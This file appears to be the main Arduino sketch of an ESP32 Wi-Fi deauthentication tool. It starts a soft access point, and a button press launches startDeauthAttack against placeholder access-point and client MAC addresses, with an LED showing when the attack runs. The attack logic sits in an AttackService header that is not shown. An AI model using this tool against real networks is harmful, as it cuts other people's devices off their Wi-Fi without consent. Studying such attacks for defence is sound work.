#include <Arduino.h>
#include <WiFi.h>

#include "Networks/Services/WifiService.h"
#include "Networks/Services/AttackService.h"

#include "RGB/LedRGB.h"

WifiService wifi;
AttackService attackService;
LedRGB led;


void setup(){

    Serial.begin(115200);
    Serial.println("Started");
    delay(500);
    
    pinMode(0, INPUT_PULLUP);
    led.init();

    wifi.setSoftAPConfig(DEFAULT_AP_CONFIG);

    wifi.softAP();

    delay(500);

    IPAddress IP = WiFi.softAPIP();
    Serial.print("AP IP address: ");
    Serial.println(IP);

    led.setColor(GREEN);
}

void loop(){
    if(!digitalRead(0)){
        MacAddress apMac = MacAddress::fromString("TARGET_AP");
        MacAddress staMac = MacAddress::fromString("TARGET_STA");
        
        led.setColor(RED);
        
        attackService.startDeauthAttack(apMac, staMac, 5);
        
        led.setColor(GREEN);

        Serial.println(attackService.getExecutionTime());
    }
    // delay(1000);
    delay(100);
}